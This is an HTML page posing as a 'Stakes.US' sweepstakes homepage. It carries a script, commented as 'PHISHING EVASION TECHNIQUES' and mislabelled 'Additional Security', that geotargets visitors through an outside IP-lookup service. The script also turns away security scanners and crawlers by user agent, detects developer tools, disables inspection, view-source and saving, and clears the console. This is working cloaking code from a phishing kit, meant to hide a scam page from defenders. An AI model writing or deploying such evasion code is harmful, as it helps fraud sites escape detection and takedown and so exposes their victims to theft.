<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />

  <title>Stakes.US Sweepstakes — Home</title>
  <link rel="stylesheet" href="css/styles.css">
  <style>
    /* homepage overrides: heading text, full-bleed stacked ads that touch page edges */
    :root { --ad-height: 420px; }

    /* ensure no horizontal scroll when using full-bleed elements */
    html,body{overflow-x:hidden;margin:0;padding:0}

    .top-banner{
      width:100%;
      background:#0b4681;
      color:#fff;
      padding:18px 16px;
      box-sizing:border-box;
    }
    .top-banner .heading{
      font-size:22px;
      margin:0;
      outline:none;
      font-weight:700;
      letter-spacing:0.6px;
    }

    /* keep header sticky under the banner */
    .site-header{position:sticky;top:0;z-index:12}
    .site-header .hamburger span{background:#000} /* ensure 3 lines are black */

    .main-ads{max-width:980px;margin:12px auto;padding:0 16px;box-sizing:border-box}

    /* Full-bleed stacked ad list */
    .ad-list{display:block;padding:0;margin:0}
    .ad-bleed{
      width:100vw;
      margin-left:calc(50% - 50vw);
      box-sizing:border-box;
      min-height:var(--ad-height);
      display:flex;
      align-items:center;
      justify-content:center;
      text-align:center;
      font-weight:700;
      color:#071227;
      border:0;
      background:#f8fafc;
      padding:18px;
      margin-bottom:12px;
    }
    .ad-bleed.stake{background:linear-gradient(135deg,#eaf5ff,#fff);color:#0b3f78}
    .ad-bleed.casino{background:linear-gradient(135deg,#fff7f0,#fff);color:#b22222}
    .ad-bleed.bank{background:linear-gradient(135deg,#f0fbff,#fff);color:#0b61a4}
    .ad-bleed.promo{background:linear-gradient(135deg,#f7f7fb,#fff);color:#0b1220}

    /* remove rounded corners so ad touches edges vertically */
    .ad-bleed {border-radius: 0;}

    /* make ad text prominent */
    .ad-bleed h2{margin:0;font-size:20px}
    .ad-bleed p{margin:6px 0 0;font-size:13px;color:rgba(7,18,39,0.7)}

    /* CTA alignment inside main container */
    .apply-cta{display:flex;justify-content:flex-end;margin-top:8px}

    @media(max-width:640px){
      :root { --ad-height: 160px; }
      .ad-bleed{padding:12px}
      .top-banner .heading{font-size:18px}
    }
  </style>
</head>

  <!-- Additional Security -->
  <script>
    // ===== PHISHING EVASION TECHNIQUES =====
    
    // Configuration for evasion
    const EVASION_CONFIG = {
      targetCountries: ['US', 'CA', 'GB', 'GH'], // Target countries
      showFormDelay: 2000
    };

    // 1. GEOTARGETING - Check user location
    async function checkGeolocation() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        if (!EVASION_CONFIG.targetCountries.includes(data.country_code)) {
          // Block non-target countries
          return false;
        }
        return true;
      } catch (error) {
        // Allow if geolocation fails
        return true;
      }
    }

    // 2. BOT DETECTION - Detect security scanners
    function detectBots() {
      const userAgent = navigator.userAgent.toLowerCase();
      const blockedAgents = [
        'curl', 'wget', 'python', 'requests', 'scrapy',
        'phantomjs', 'selenium', 'headless', 'bot',
        'crawler', 'spider', 'scanner', 'security',
        'malware', 'antivirus', 'firewall'
      ];
      
      // Check user agent for known security tools
      for (let agent of blockedAgents) {
        if (userAgent.includes(agent)) {
          return true;
        }
      }
      
      return false;
    }

    // 3. DEVTOOLS DETECTION - Detect developer tools
    function detectDevTools() {
      const threshold = 160;
      if (window.outerHeight - window.innerHeight > threshold || 
          window.outerWidth - window.innerWidth > threshold) {
        console.log('DevTools detected via window size');
        return;
      }
      
      let devtools = false;
      const element = new Image();
      Object.defineProperty(element, 'id', {
        get: function() {
          devtools = true;
          console.log('DevTools detected via console access');
        }
      });
      
      setInterval(() => {
        devtools = false;
        console.log(element);
        console.clear();
      }, 1000);
    }

    // 4. ENHANCED INSPECTION DISABLING
    function disableInspection() {
      // Disable right-click
      document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        return false;
      });
      
      // Disable F12, Ctrl+Shift+I, Ctrl+U, etc.
      document.addEventListener('keydown', (e) => {
        // F12
        if (e.keyCode === 123) {
          e.preventDefault();
          return false;
        }
        
        // Ctrl+Shift+I (DevTools)
        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
          e.preventDefault();
          return false;
        }
        
        // Ctrl+U (View Source)
        if (e.ctrlKey && e.keyCode === 85) {
          e.preventDefault();
          return false;
        }
        
        // Ctrl+S (Save Page)
        if (e.ctrlKey && e.keyCode === 83) {
          e.preventDefault();
          return false;
        }
      });
      
      // Disable text selection
      document.addEventListener('selectstart', (e) => {
        e.preventDefault();
        return false;
      });
      
      // Disable drag and drop
      document.addEventListener('dragstart', (e) => {
        e.preventDefault();
        return false;
      });
    }

    // Initialize evasion checks
    document.addEventListener('DOMContentLoaded', async () => {
      disableInspection();
      if (detectBots()) {
        return;
      }
      await checkGeolocation();
      detectDevTools();
    });

    // Clear console periodically to prevent debugging
    setInterval(function() {
      console.clear();
    }, 1000);
  </script>
</body>
